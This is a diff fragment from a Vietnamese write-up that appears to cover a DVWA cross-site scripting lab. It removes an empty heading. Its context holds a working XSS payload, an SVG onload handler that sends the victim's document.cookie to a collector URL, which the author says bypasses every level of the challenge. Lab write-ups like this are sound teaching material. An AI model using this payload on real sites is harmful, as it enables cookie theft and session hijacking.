@@ -153,8 +153,6 @@ Ta sẽ dùng hàm `htmlspecialchars()` để biến các kí tự đặc biệt
 
 ---
 
-## __What we learned__
-
 ## __Some problems__
 
 Thực chất, ta chỉ cần dùng payload `<svg xmlns="http://www.w3.org/2000/svg" onload="document.location='http://localhost:8000/?abc='+document.cookie"/>` là có thể bypass full cấp độ ở challenge này nhưng tôi muốn đề cập theo hướng mà bên dvwa họ hướng đến việc chúng ta sẽ làm. 
